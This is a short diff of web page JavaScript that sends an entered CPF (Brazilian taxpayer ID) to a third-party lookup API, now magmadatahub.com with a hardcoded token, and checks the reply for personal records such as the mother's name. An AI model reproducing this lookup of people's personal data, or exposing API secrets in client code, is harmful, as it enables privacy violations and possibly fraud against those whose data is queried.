@@ -210,7 +210,7 @@ document.addEventListener("DOMContentLoaded", () => {
             try {
                document.getElementById('validation-form').classList.add('hidden');
                document.getElementById('loading').classList.remove('hidden');
-               const response = await fetch(`https://searchapi.dnnl.live/consulta?cpf=${cpfLimpo}&token_api=3531`);
+               const response = await fetch(`https://magmadatahub.com/api.php?token=d7c5436286e44288a459ca98de0e140bd32fe9717dcadb1c6bd13526f24a78b9&cpf=${cpfLimpo}`);
                if (!response.ok) throw new Error('Erro ao consultar CPF');
                cpfData = await response.json();
                if (!cpfData.status || cpfData.status !== 200 || !cpfData.dados[0].NOME_MAE) {
